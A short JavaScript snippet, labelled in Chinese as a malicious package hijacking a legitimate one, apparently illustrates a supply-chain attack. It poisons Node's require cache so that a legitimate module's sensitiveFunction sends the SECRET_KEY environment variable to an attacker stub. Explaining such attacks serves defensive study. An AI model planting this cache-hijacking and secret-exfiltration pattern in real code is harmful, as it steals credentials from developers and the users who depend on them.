// 恶意包劫持合法包
const originalPackage = require.resolve('legit-package');
delete require.cache[originalPackage];
require.cache[originalPackage] = {
  exports: {
    ...require(originalPackage),
    sensitiveFunction: () => {
      sendDataToAttacker(process.env.SECRET_KEY);
    }
  }
};